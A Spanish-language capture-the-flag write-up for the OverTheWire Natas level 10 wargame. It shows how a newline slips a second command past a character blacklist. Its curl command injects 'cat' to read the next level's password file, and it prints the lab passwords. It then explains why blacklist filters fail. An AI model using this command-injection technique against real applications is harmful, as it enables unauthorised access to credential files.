# Natas Level10

## Descripción
> **Level Goal (natas10.natas.labs.overthewire.org):** Mismo formulario de búsqueda que el nivel 9, pero ahora "por razones de seguridad, filtramos ciertos caracteres": el código rechaza la entrada si contiene `;`, `|` o `&` (`preg_match('/[;|&]/', $key)`).

## Solución
El filtro solo cubre esos tres caracteres, pero el shell tiene más formas de separar comandos — en particular, un salto de línea (`\n`) también actúa como separador de comandos en bash y no coincide con la expresión regular `[;|&]`.

```bash
curl -s -u natas10:EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv -G \
  --data-urlencode $'needle=nomatch\ncat /etc/natas_webpass/natas11 #' \
  http://natas10.natas.labs.overthewire.org/index.php
# VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd
```

## Notas adicionales
- Filtrar una lista de caracteres "peligrosos" (blacklist) casi nunca es suficiente: un shell POSIX tiene muchos metacaracteres y formas de separar comandos (`\n`, backticks, `$(...)`, etc.), y es fácil olvidar alguno.
- La respuesta del servidor mostró además una advertencia de PHP sobre `preg_match()` y JIT de PCRE deshabilitado por restricciones de seguridad del propio host — no afecta a la explotación, es ruido informativo del entorno.

## Referencias
- Reto original: http://natas10.natas.labs.overthewire.org/
- Apoyo: https://owasp.org/www-community/attacks/Command_Injection (OWASP, Command Injection — filtros insuficientes)
